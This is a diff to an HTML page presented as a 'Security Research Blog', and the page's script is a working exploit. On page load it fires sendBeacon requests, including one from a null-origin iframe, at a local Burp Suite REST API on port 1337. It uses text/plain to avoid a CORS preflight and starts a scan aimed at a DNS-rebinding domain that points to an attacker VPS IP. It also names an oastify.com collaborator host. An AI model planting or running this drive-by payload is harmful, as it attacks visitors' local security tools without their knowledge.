@@ -5,21 +5,18 @@
 <h1>Security Research Blog</h1>
 <p>Latest articles on application security.</p>
 <script>
-// CONFIG
 var COLLAB = "xmn73qreun7f369i5s6g2rhev51wpodd.oastify.com";
-var ATTACKER_IP = "172.31.32.1";
-var TARGET_IP = "127.0.0.1";
+var VPS_IP = "172.236.169.244";
 var API_PORT = 1337;
+var REBIND_DOMAIN = "make-" + VPS_IP + "-rebind-127.0.0.1-rr.1u.ms";
 
-// 1u.ms DNS rebinding domain — first resolve → ATTACKER_IP, then → TARGET_IP
-var REBIND_DOMAIN = "make-" + ATTACKER_IP + "-rebind-" + TARGET_IP + "-rr.1u.ms";
-
+// Create scan targeting the DNS rebinding page on same port as Burp API
 var scan = JSON.stringify({urls: ["http://" + REBIND_DOMAIN + ":" + API_PORT + "/"]});
 
-// Direct sendBeacon to Burp API (text/plain = no CORS preflight)
+// sendBeacon to Burp API — text/plain bypasses CORS preflight
 try { navigator.sendBeacon("http://127.0.0.1:" + API_PORT + "/v0.1/scan", scan); } catch(e) {}
 
-// Also from null-origin iframe for extra reliability
+// Also from null-origin iframe
 var f = document.createElement("iframe");
 f.srcdoc = '<script>try{navigator.sendBeacon("http://127.0.0.1:' + API_PORT + '/v0.1/scan",' +
     JSON.stringify(scan) + ')}catch(e){}<\/script>';
